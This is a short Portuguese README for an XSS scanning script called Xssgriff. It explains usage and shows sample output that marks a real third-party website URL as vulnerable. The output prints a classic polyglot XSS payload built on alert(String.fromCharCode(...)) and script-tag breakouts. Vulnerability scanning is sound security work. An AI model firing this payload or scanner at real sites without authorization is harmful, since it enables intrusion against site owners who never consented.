Xssgriff, script para analizar vulnerabilidade em XSS.

Modo de uso:
python xss.py 
url : teste.com.br/page?parameter=

Digite a url:
URL: http://www.koinonia.org.br/tpdigital/detalhes.asp?cod_artigo=161&cod_boletim=9&tipo=
Lembrando com parametro! 
e o resultado sera 
http://www.koinonia.org.br/tpdigital/detalhes.asp?cod_artigo=161&cod_boletim=9&tipo=
Vulneravel: ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

Realiza o teste! 
Obrigado

Ao final, mostrando os payloads vulneraveis.
